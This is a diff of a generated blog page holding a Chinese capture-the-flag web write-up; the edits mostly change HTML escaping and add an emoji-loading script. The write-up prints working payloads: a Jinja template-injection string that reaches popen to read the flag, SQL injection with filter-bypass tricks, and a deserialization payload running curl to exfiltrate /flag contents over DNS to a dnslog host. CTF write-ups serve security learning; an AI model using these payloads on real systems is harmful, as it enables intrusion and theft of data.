@@ -415,7 +415,7 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="lt-4"><a href="#lt-4" class="headerlink" title="&lt;=4"></a>&lt;=4</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+                <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="lt-4"><a href="#lt-4" class="headerlink" title="<=4"></a>&lt;=4</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'/www/sandbox/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"ctf"</span> <span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -508,16 +508,16 @@ ssti，`{%print(7*7)%}`，得到49
 <p>最终payload    </p>
 {% raw %}
 
->`http://219.219.61.234:50050/?name={%print((()|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)()|attr(request.cookies.d)(132)|attr(request.cookies.e)|attr(request.cookies.f)|attr(request.cookies.d)(request.cookies.g))(request.cookies.h).read())%}Cookie: h=catf*;a=__class__;b=__base__;c=__subclasses__;d=__getitem__;e=__init__;f=__globals__;g=popen`
+`http://219.219.61.234:50050/?name={%print((()|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)()|attr(request.cookies.d)(132)|attr(request.cookies.e)|attr(request.cookies.f)|attr(request.cookies.d)(request.cookies.g))(request.cookies.h).read())%}Cookie: h=catf*;a=__class__;b=__base__;c=__subclasses__;d=__getitem__;e=__init__;f=__globals__;g=popen`
 
 {% endraw %}
 
 <h2 id="EZSQLI"><a href="#EZSQLI" class="headerlink" title="EZSQLI"></a>EZSQLI</h2><p>这题写的心态蹦了，fuzzing实在是太磨人了，自闭</p>
 <p>页面只有一个注册页面和一个登录页面，数据库限制了用户名插入的长度，并且对用户名进行了mysql_real_escape_string，思路类似于过滤单引号的注入，直接注册123\\\\（打很多\，数据库会自动截断30字符）</p>
-<p>这样登录时\会将后面的<code>&#39;</code>注释掉，最终password就逃逸了出来，就比如，username=’123\\\‘and password=’union select 1,2,3#’。</p>
+<p>这样登录时\会将后面的<code>'</code>注释掉，最终password就逃逸了出来，就比如，username=’123\\\‘and password=’union select 1,2,3#’。</p>
 <p>并且登录还对password进行了单次过滤</p>
-<pre><code>$list=array(&quot; &quot;,&quot;or&quot;,&quot;select&quot;,&quot;and&quot;,&quot;union&quot;);
-$passowrd=str_ireplace($list,&quot;&quot;,$passowrd);</code></pre>
+<pre><code>$list=array(" ","or","select","and","union");
+$passowrd=str_ireplace($list,"",$passowrd);</code></pre>
 <p>但登录界面就登录成功和密码错误两种状态，fuzz起来属实恶心，知道源码后直接双写绕过就行</p>
 <p>查显示点</p>
 <pre><code>username=1233\\\\\\\\\\\\\\\\\\\\\\\\\\\password=uniunionon/**/seleselectct/**/1,2,3;</code></pre>
@@ -679,9 +679,27 @@ $passowrd=str_ireplace($list,&quot;&quot;,$passowrd);</code></pre>
 <span class="token delimiter">?></span></code></pre>
 <p>由于最初序列化的是整个$_POST数组，前面会有个序列化数组的格式，直接输入，我们的payload会储存在数组中，反序列化后也只是数组中的字符串值，所以我们要进行闭合，闭合的是insert语句</p>
 <p>payload</p>
-<pre><code>&#39;),(&#39;test&#39;,&#39;O:4:&quot;test&quot;:1:{s:4:&quot;test&quot;;s:40:&quot;curl `cat/flag|base64`.069kqq.dnslog.cn&quot;;}&#39;)-- </code></pre>
-<p><code>&#39;)</code>闭合了前面的语句，是前面的用户留言为之前的数组语句，<code>(&#39;test&#39;,&#39;O:4:&quot;test&quot;:1:{s:4:&quot;test&quot;;s:40:&quot;curl </code>cat/flag|base64<code>.069kqq.dnslog.cn&quot;;}&#39;)</code>，此语句插入的为用户test的留言，内容为<code>O:4:&quot;test&quot;:1:{s:4:&quot;test&quot;;s:40:&quot;curl </code>cat/flag|base64<code>.069kqq.dnslog.cn&quot;;}</code>，然后登录查询test用户的留言即可反序列化成功，查看dns解析记录即可得到flag。(curl xxx.069kqq.dnslog.cn，那边会记录 xxx.069kqq.dnslog.cn这条访问记录)</p>
-
+<pre><code>'),('test','O:4:"test":1:{s:4:"test";s:40:"curl `cat/flag|base64`.069kqq.dnslog.cn";}')-- </code></pre>
+<p><code>')</code>闭合了前面的语句，是前面的用户留言为之前的数组语句，<code>('test','O:4:"test":1:{s:4:"test";s:40:"curl </code>cat/flag|base64<code>.069kqq.dnslog.cn";}')</code>，此语句插入的为用户test的留言，内容为<code>O:4:"test":1:{s:4:"test";s:40:"curl </code>cat/flag|base64<code>.069kqq.dnslog.cn";}</code>，然后登录查询test用户的留言即可反序列化成功，查看dns解析记录即可得到flag。(curl xxx.069kqq.dnslog.cn，那边会记录 xxx.069kqq.dnslog.cn这条访问记录)</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
             </div>
             <hr/>
 
